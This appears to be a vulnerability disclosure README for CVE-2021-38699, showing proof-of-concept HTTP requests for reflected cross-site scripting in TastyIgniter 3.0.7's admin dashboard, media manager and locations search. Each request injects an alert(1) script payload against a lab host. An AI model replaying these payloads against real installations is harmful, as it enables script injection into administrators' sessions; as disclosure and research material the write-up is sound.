# CVE-2021-38699 : Multiple Reflected XSS in TastyIgniter v3.0.7 Restaurtant CMS

Authenticated reflected XSS exists in the TastyIgniter Admin dashboard in version 3.0.7.

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38699

## POC:

### Admin dashboard start param:

```
POST http://cvefarm.local/admin/dashboard HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-IGNITER-REQUEST-HANDLER: charts::onFetchDatasets
X-CSRF-TOKEN: 37EWVV424abZPiH6H1L6CWZvTYhEfx3XK73Xa4A5
X-Requested-With: XMLHttpRequest
Content-Length: 81
Origin: https://cvefarm.local
Connection: keep-alive
Referer: https://cvefarm.local/admin/dashboard
Cookie: tastyigniter_session=[session/admin_session]
Host: cvefarm.local

start=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&end=2021-08-12T12%3A48%3A16.747Z
```
![2021-08-12 17_47_46-dev-kali - VMware Workstation](https://user-images.githubusercontent.com/57866415/129274696-55bff047-b328-44bf-9a33-0ab498dd934b.png)

###  Admin dashboard end param:

```
POST http://cvefarm.local/admin/dashboard HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-IGNITER-REQUEST-HANDLER: charts::onFetchDatasets
X-CSRF-TOKEN: 37EWVV424abZPiH6H1L6CWZvTYhEfx3XK73Xa4A5
X-Requested-With: XMLHttpRequest
Content-Length: 81
Origin: https://cvefarm.local
Connection: keep-alive
Referer: https://cvefarm.local/admin/dashboard
Cookie: tastyigniter_session=[session/admin_session]
Host: cvefarm.local


start=2021-07-14T12%3A48%3A16.746Z&end=%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
```

![image](https://user-images.githubusercontent.com/57866415/129274604-6406f542-b515-4f3a-862b-1b2246c00ad0.png)


## Media Manager path parameter

```
POST http://cvefarm.local/admin/media_manager HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-IGNITER-REQUEST-HANDLER: manager::onGoToFolder
X-CSRF-TOKEN: QVRktQkPLxizjY3vbMe2dQ5ZgZMfMalZYnQZzMes
X-Requested-With: XMLHttpRequest
Content-Length: 56
Origin: https://cvefarm.local
Connection: keep-alive
Referer: https://cvefarm.local/admin/media_manager
Cookie: tastyigniter_session=[session/admin_session]
Host: cvefarm.local

path=%22%3E%00%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E
```

## Location parameter
```
GET http://cvefarm.local/locations?search=javascript%3Aalert%281%29%3B HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Pragma: no-cache
Cache-Control: no-cache
Content-Length: 0
Referer: http://cvefarm.local/locations
Cookie: tastyigniter_session=[session]
Host: cvefarm.local
```


## Other Images
![2021-08-12 10_13_26-dev-kali - VMware Workstation](https://user-images.githubusercontent.com/57866415/129272524-16dc2e0b-191c-4c87-ae32-8cd71a4d8c61.png)
![2021-08-12 10_13_39-dev-kali - VMware Workstation](https://user-images.githubusercontent.com/57866415/129272533-1b063f32-4cac-44e7-aede-4bfda576b2c6.png)
![unknown](https://user-images.githubusercontent.com/57866415/129272541-2827d108-eb5b-4df8-aea8-4a5ebfad67b0.png)

## Discovery
August 2021
- Matt Kiely | HuskyHacks
- Justin White (https://github.com/Justin-1993/CVE-2021-38699 & https://pentesternotes.com/?p=209)
